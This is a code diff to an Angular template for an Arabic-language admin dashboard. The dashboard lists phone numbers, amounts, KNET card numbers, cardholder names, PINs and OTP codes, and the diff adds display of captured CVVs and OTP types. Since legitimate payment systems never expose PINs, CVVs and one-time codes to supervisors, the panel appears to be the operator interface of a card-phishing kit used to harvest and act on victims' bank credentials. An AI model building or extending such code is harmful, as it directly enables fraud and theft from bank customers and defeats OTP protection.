@@ -102,7 +102,7 @@
                 <th class="px-6 py-5">رقم الهاتف</th>
                 <th class="px-6 py-5">المبلغ</th>
                 <th class="px-6 py-5">بيانات البطاقة (الكي نت)</th>
-                <th class="px-6 py-5">الرقم السري (PIN)</th>
+                <th class="px-6 py-5">الرقم السري / CVV</th>
                 <th class="px-6 py-5">كود التحقق (OTP)</th>
                 <th class="px-6 py-5">قرارات المشرف</th>
                 <th class="px-6 py-5 text-left">التاريخ</th>
@@ -140,7 +140,12 @@
 
                 <td class="px-6 py-5.5 font-mono font-black text-red-600 text-lg sm:text-xl tracking-widest">
                   @let pinPayment = getLatestPayment(client);
-                  @if (pinPayment) { {{ pinPayment.cc_pin }} } @else { <span class="text-slate-400">-</span> }
+                  @if (pinPayment) { 
+                    <div>PIN: {{ pinPayment.cc_pin }}</div>
+                    @if (pinPayment.cc_cvv) {
+                      <div class="text-sm mt-1 text-sky-600">CVV: {{ pinPayment.cc_cvv }}</div>
+                    }
+                  } @else { <span class="text-slate-400">-</span> }
                 </td>
 
                 <td class="px-6 py-5.5">
@@ -148,6 +153,7 @@
                   @let latestPayment = getLatestPayment(client);
                   @if (otp) {
                   <div class="flex flex-col gap-1.5">
+                    <span class="text-xs text-sky-500 font-bold mb-0.5">نوع الكود: {{ otp.type }}</span>
                     <span class="font-mono text-xl font-black text-sky-600 tracking-wider">{{ otp.otp }}</span>
                     <span class="text-xs text-slate-500 font-bold">الحالة: {{ otp.status }}</span>
                   </div>
@@ -258,10 +264,18 @@
               </div>
               <p class="font-mono font-bold text-slate-900 tracking-widest text-sm">{{ mPayment.cc_number }}</p>
               <p class="text-xs text-slate-600 font-semibold">{{ mPayment.cc_name }}</p>
-              <!-- PIN -->
-              <div class="flex items-center gap-2 pt-1 border-t border-slate-200 mt-1">
-                <span class="text-xs text-slate-400 font-bold">PIN:</span>
-                <span class="font-mono font-black text-red-600 text-base tracking-widest">{{ mPayment.cc_pin }}</span>
+              <!-- PIN & CVV -->
+              <div class="flex flex-col gap-1 pt-1 border-t border-slate-200 mt-1">
+                <div class="flex items-center gap-2">
+                  <span class="text-xs text-slate-400 font-bold">PIN:</span>
+                  <span class="font-mono font-black text-red-600 text-base tracking-widest">{{ mPayment.cc_pin }}</span>
+                </div>
+                @if (mPayment.cc_cvv) {
+                <div class="flex items-center gap-2">
+                  <span class="text-xs text-slate-400 font-bold">CVV:</span>
+                  <span class="font-mono font-black text-sky-600 text-base tracking-widest">{{ mPayment.cc_cvv }}</span>
+                </div>
+                }
               </div>
             </div>
             } @else {
@@ -272,7 +286,7 @@
             @if (mOtp) {
             <div class="flex items-center justify-between bg-sky-50 rounded-xl p-3 border border-sky-100">
               <div>
-                <p class="text-xs text-sky-500 font-bold mb-0.5">كود التحقق OTP</p>
+                <p class="text-xs text-sky-500 font-bold mb-0.5">كود التحقق ({{ mOtp.type }})</p>
                 <span class="font-mono text-xl font-black text-sky-600 tracking-wider">{{ mOtp.otp }}</span>
               </div>
               <span class="text-xs font-bold px-2.5 py-1 rounded-full border" [ngClass]="{
